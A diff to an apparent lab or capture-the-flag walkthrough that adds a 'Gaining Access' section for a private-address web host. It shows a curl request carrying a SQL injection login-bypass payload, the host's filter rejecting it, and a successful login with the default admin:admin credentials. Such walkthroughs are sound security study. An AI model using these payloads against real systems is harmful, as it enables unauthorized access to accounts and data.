@@ -40,10 +40,24 @@ Interesting Findings
 /myfiles.php - File manager
 
 ## Phase 3: Gaining Access
-Default Credentials
+1. Check Login Page
 ``` bash
-curl -X POST http://10.150.150.11/login.php -d "username=admin&password=admin"
+curl http://10.150.150.11/login.php
 ```
+Attempt 1: SQL Injection
+Trying SQL injection at login page:
+```bash
+curl -X POST http://10.150.150.11/login.php -d "username=admin' OR '1'='1&password=anything"
+```
+Response: Error "Char or String '=' is not allowed" - website have filtering.
+
+Attempt 2: Trying Default Credentials:
+``` bash
+curl -X POST http://10.150.150.11/login.php \
+  -d "username=admin&password=admin" \
+  -L \
+  -c cookies.txt
+``` 
 Success! Logged in with admin:admin
 
 ## Phase 4: Exploitation
